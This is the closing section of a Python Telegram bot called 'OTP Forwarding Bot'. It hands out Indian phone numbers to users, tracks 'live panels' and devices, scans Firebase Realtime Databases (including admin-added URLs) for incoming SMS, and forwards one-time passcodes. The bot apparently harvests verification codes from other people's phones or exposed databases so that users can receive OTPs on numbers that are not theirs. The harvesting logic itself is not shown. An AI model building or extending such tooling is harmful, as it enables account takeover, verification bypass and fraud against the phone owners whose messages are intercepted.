                [KeyboardButton(BTN_MY), KeyboardButton(BTN_CANCEL)],
                [KeyboardButton(BTN_MENU)]
            ]))
        return

    # ── LIVE NUMBERS LIST ──
    if text == BTN_LIVENUMS:
        if not is_admin:
            return
        live = [(n, NUMBER_PROFILES[n]) for n in NUMBER_PROFILES if NUMBER_PROFILES[n].assigned_to is None]
        if not live:
            await msg.reply_text("\U0001F480 No numbers available yet.\nMonitoring in progress...",
                                 reply_markup=back_keyboard())
            return
        _user_list[uid] = live
        _user_page[uid] = 0
        await msg.reply_text(
            f"\U0001F525 Available Numbers ({len(live)})\n\nTap to assign \U0001F447",
            reply_markup=live_number_keyboard(live, page=0))
        return

    # ── DEAD NUMBERS LIST ──
    if text == BTN_DEADNUMS:
        if not is_admin:
            return
        dead = [(n, NUMBER_PROFILES[n]) for n in NUMBER_PROFILES if NUMBER_PROFILES[n].assigned_to is None]
        if not dead:
            await msg.reply_text("No numbers available! \U0001F525",
                                 reply_markup=back_keyboard())
            return
        _user_list[uid] = dead[:50]
        _user_page[uid] = 0
        await msg.reply_text(
            f"\U0001F480 Idle Numbers ({len(dead)})\n\nTap to assign \U0001F447",
            reply_markup=live_number_keyboard(dead[:50], page=0))
        return

    # ── TOP NUMBERS ──
    if text == BTN_TOPNUMS:
        if not is_admin:
            return
        top = get_all_numbers()[:20]
        if not top:
            await msg.reply_text("No numbers yet.", reply_markup=back_keyboard())
            return
        _user_list[uid] = top
        _user_page[uid] = 0
        await msg.reply_text(
            f"\U0001F4C8 Numbers\n\nTap to assign \U0001F447",
            reply_markup=live_number_keyboard(top, page=0))
        return

    # ── PAGE NAVIGATION ──
    if text in (BTN_PREV, BTN_NEXT):
        lst = _user_list.get(uid, [])
        if not lst:
            await msg.reply_text("Open a list first.", reply_markup=main_keyboard(is_admin))
            return
        page = _user_page.get(uid, 0) + (1 if text == BTN_NEXT else -1)
        per_page = 10
        max_page = max(0, (len(lst) - 1) // per_page)
        page = max(0, min(page, max_page))
        _user_page[uid] = page
        await msg.reply_text(
            f"\U0001F4F1 Numbers (Page {page+1})\n\nTap to assign \U0001F447",
            reply_markup=live_number_keyboard(lst, page=page))
        return

    # ── PICK NUMBER (dynamic label) ──
    m = re.search(r"\+91(\d{10})", text)
    if m:
        num = m.group(1)
        if uid in USER_WAITING:
            cur = USER_WAITING[uid]
            await msg.reply_text(
                f"\u23F3 Already waiting for +91{cur}. Cancel first.",
                reply_markup=_kb([
                    [KeyboardButton(BTN_CANCEL)],
                    [KeyboardButton(BTN_MENU)]
                ]))
            return

        if num not in NUMBER_PROFILES or NUMBER_PROFILES[num].assigned_to is not None:
            await msg.reply_text("\u274C Number no longer available. Pick another.",
                                 reply_markup=_kb([
                                     [KeyboardButton(BTN_GET)],
                                     [KeyboardButton(BTN_MENU)]
                                 ]))
            return

        prof = NUMBER_PROFILES[num]
        prof.assigned_to = uid
        USER_WAITING[uid] = num
        USER_WAIT_TIME[uid] = time.time()
        logger.info(f"\U0001F4CB User {uid} picked number +91{num}")
        logger.info(f"\U0001F4CB USER_WAITING now: {dict(USER_WAITING)}")

        devs = NUM_TO_DEVICES.get(num, [])
        online_panels = sum(1 for d in devs if d.status == "online")
        emoji = prof.live_status_emoji
        status_text = {
            "\U0001F525": "\U0001F525 HOT!",
            "\U0001F7E2": "\U0001F7E2 LIVE!",
            "\U0001F7E1": "\U0001F7E1 WARM",
            "\U0001F7E0": "\U0001F7E0 COOLING",
            "\U0001F480": "\U0001F480 IDLE"
        }.get(emoji, "Unknown")

        await msg.reply_text(
            f"\U0001F4F1 Number Assigned!\n\n"
            f"Number: +91{num}\n"
            f"{status_text}\n"
            f"\U0001F4C8 Recent OTPs (5m): {prof.recent_otp_count}\n"
            f"\U0001F4BB Live Panels: {online_panels}\n\n"
            f"\u26A1 Watching for OTP...",
            reply_markup=_kb([
                [KeyboardButton(BTN_MY), KeyboardButton(BTN_CANCEL)],
                [KeyboardButton(BTN_MENU)]
            ]))
        return

    # ── MY STATUS ──
    if text == BTN_MY:
        if uid in USER_WAITING:
            num = USER_WAITING[uid]
            prof = NUMBER_PROFILES.get(num)
            elapsed = time.time() - USER_WAIT_TIME.get(uid, time.time())
            remaining = max(0, AUTO_TIMEOUT - elapsed)
            if prof:
                emoji = prof.live_status_emoji
                status_text = {
                    "\U0001F525": "\U0001F525 HOT - OTP just now!",
                    "\U0001F7E2": "\U0001F7E2 LIVE",
                    "\U0001F7E1": "\U0001F7E1 WARM",
                    "\U0001F7E0": "\U0001F7E0 COOLING",
                    "\U0001F480": "\U0001F480 IDLE"
                }.get(emoji, "Unknown")
                await msg.reply_text(
                    f"\u23F3 Waiting for OTP\n\n"
                    f"\U0001F4F1 Number: +91{num}\n"
                    f"{status_text}\n"
                    f"\U0001F4C8 Recent OTPs (5m): {prof.recent_otp_count}\n"
                    f"\u23F1 Time remaining: {int(remaining)}s\n\n"
                    f"\u26A1 Watching...",
                    reply_markup=_kb([
                        [KeyboardButton(BTN_CANCEL)],
                        [KeyboardButton(BTN_MENU)]
                    ]))
        else:
            await msg.reply_text(
                "\u274C No active waiting.\nGet a number first \U0001F447",
                reply_markup=_kb([
                    [KeyboardButton(BTN_GET)],
                    [KeyboardButton(BTN_MENU)]
                ]))
        return

    # ── CANCEL ──
    if text in (BTN_CANCEL, BTN_STOP):
        if uid in USER_WAITING:
            num = USER_WAITING.pop(uid)
            USER_WAIT_TIME.pop(uid, None)
            if num in NUMBER_PROFILES:
                NUMBER_PROFILES[num].assigned_to = None
            await msg.reply_text(
                f"\u2705 Cancelled waiting for +91{num}",
                reply_markup=_kb([
                    [KeyboardButton(BTN_GET)],
                    [KeyboardButton(BTN_MENU)]
                ]))
        else:
            await msg.reply_text("Nothing to cancel.",
                                 reply_markup=back_keyboard())
        return

    # ── STATUS (ADMIN) ──
    if text == BTN_STATUS:
        if not is_admin:
            return
        online_devs = sum(1 for d in ALL_DEVICES if d.status == "online")
        in_use = sum(1 for p in NUMBER_PROFILES.values() if p.assigned_to is not None)
        avail = len(NUMBER_PROFILES) - in_use
        scan_status = "\u2705 Ready" if _initial_sms_scan_done else "\u23F3 Initial scan..."
        await msg.reply_text(
            f"\U0001F4CA System Status\n\n"
            f"\U0001F4BB Devices: {online_devs} online / {len(ALL_DEVICES)} total\n"
            f"\U0001F4F1 Numbers: {len(NUMBER_PROFILES)}\n"
            f"\u2705 Available: {avail} | \U0001F512 In Use: {in_use}\n"
            f"\U0001F465 Users Waiting: {len(USER_WAITING)}\n"
            f"\U0001F4E9 SMS Seen: {len(SEEN_SMS)}\n"
            f"\U0001F512 OTP Dedup: {_len_otp_dedup()}\n"
            f"\U0001F50D Scan: {scan_status}\n"
            f"\U0001F517 Firebase URLs: {len(_firebase_urls)} custom + {len(DATABASES)} built-in",
            reply_markup=back_keyboard())
        return

    # ── RESCAN (ADMIN) ──
    if text == BTN_RESCAN:
        if not is_admin:
            return
        await msg.reply_text("\U0001F504 Starting rescan...",
                             reply_markup=back_keyboard())
        asyncio.create_task(scan_all_databases())
        return

    # ── ADD FIREBASE (ADMIN) ──
    if text == BTN_ADDFB:
        if not is_admin:
            return
        _admin_state[uid] = "add_url"
        await msg.reply_text(
            "\u2795 Add Firebase\n\n"
            "Send the Firebase Realtime Database URL.\n"
            "Example: https://myapp.firebaseio.com\n\n"
            "Send /cancel to abort.",
            reply_markup=back_keyboard())
        return

    # ── FIREBASE LIST (ADMIN) ──
    if text == BTN_FBLIST:
        if not is_admin:
            return
        lines = ["\U0001F4C1 Firebase Databases\n"]
        # Built-in
        lines.append(f"\U0001F4E6 Built-in ({len(DATABASES)}):")
        for tag, cfg in DATABASES.items():
            st = _firebase_stats.get(tag, {})
            lines.append(f"  \u2022 {tag}: {st.get('online', '?')} online / "
                         f"{st.get('devices', '?')} dev / {st.get('numbers', '?')} nums")
        # Custom
        lines.append(f"\n\u2795 Custom ({len(_firebase_urls)}):")
        if not _firebase_urls:
            lines.append("  (none added yet)")
        for i, entry in enumerate(_firebase_urls):
            tag = f"custom_{i+1}"
            st = _firebase_stats.get(tag, {})
            lines.append(f"  {i+1}. {entry.get('url')}")
            lines.append(f"     {st.get('online', '?')} online / "
                         f"{st.get('devices', '?')} dev / {st.get('numbers', '?')} nums")
        lines.append("\nUse \U0001F5D1 Remove Firebase to delete one.")
        await msg.reply_text("\n".join(lines), reply_markup=back_keyboard())
        return

    # ── REMOVE FIREBASE (ADMIN) ──
    if text == BTN_RMFB:
        if not is_admin:
            return
        if not _firebase_urls:
            await msg.reply_text("No custom Firebase URLs to remove.",
                                 reply_markup=back_keyboard())
            return
        lines = ["\U0001F5D1 Remove Firebase\n"]
        for i, entry in enumerate(_firebase_urls):
            lines.append(f"  {i+1}. {entry.get('url')}")
        lines.append("\nSend the number to remove, or /cancel.")
        _admin_state[uid] = "remove"
        await msg.reply_text("\n".join(lines), reply_markup=back_keyboard())
        return

# ── CANCEL COMMAND ───────────────────────────────────────────────────────────
async def cmd_cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_chat.id
    _admin_state.pop(uid, None)
    _pending_url.pop(uid, None)
    await update.message.reply_text("\u2705 Cancelled.",
                                    reply_markup=main_keyboard(uid == ADMIN_ID))

# ── START COMMAND ────────────────────────────────────────────────────────────
async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_chat.id
    if uid not in _allowed_users:
        await update.message.reply_text("\u26d4 Not authorized. Contact admin.")
        return
    if not _scan_done:
        await update.message.reply_text("\u23f3 System scanning... Please wait.",
                                         reply_markup=back_keyboard())
        return
    avail = sum(1 for n, p in NUMBER_PROFILES.items() if p.assigned_to is None)
    is_admin = (uid == ADMIN_ID)
    scan_status = "\u2705 Ready" if _initial_sms_scan_done else "\u23f3 Initial SMS scan in progress..."
    await update.message.reply_text(
        f"\U0001F916 OTP Forwarding Bot\n\n"
        f"\U0001F4F1 Available Numbers: {avail}\n"
        f"\U0001F465 Waiting: {len(USER_WAITING)}\n"
        f"\U0001F4C8 Total Numbers: {len(NUMBER_PROFILES)}\n"
        f"\U0001F50D Status: {scan_status}\n\n"
        f"Tap a button below \U0001F447",
        reply_markup=main_keyboard(is_admin))

# ── MAIN ─────────────────────────────────────────────────────────────────────
def main():
    global _app
    print("=" * 50)
    print("  \U0001F511 OTP BOT - LIVE NUMBER SYSTEM v4.0")
    print("=" * 50)
    print(f"Admin: {ADMIN_ID}")
    print(f"Built-in Databases: {len(DATABASES)}")
    print(f"Direct Connection (No Proxy)")
    print(f"No scoring - any online number is handed out")
    print(f"Dynamic Firebase URL management enabled")
    print()

    load_firebase_urls()

    app = Application.builder().token(TOKEN).build()
    _app = app

    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("cancel", cmd_cancel))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

    async def post_init(application):
        await application.bot.delete_webhook(drop_pending_updates=True)
        await send_admin("\U0001F511 OTP Bot v4.0 starting! Scanning databases & pre-seeding SMS...")
        await scan_all_databases()
        await initial_sms_scan()
        await asyncio.sleep(3)
        asyncio.create_task(background_monitor_loop())

    app.post_init = post_init
    app.run_polling(drop_pending_updates=True)

if __name__ == "__main__":
    main()
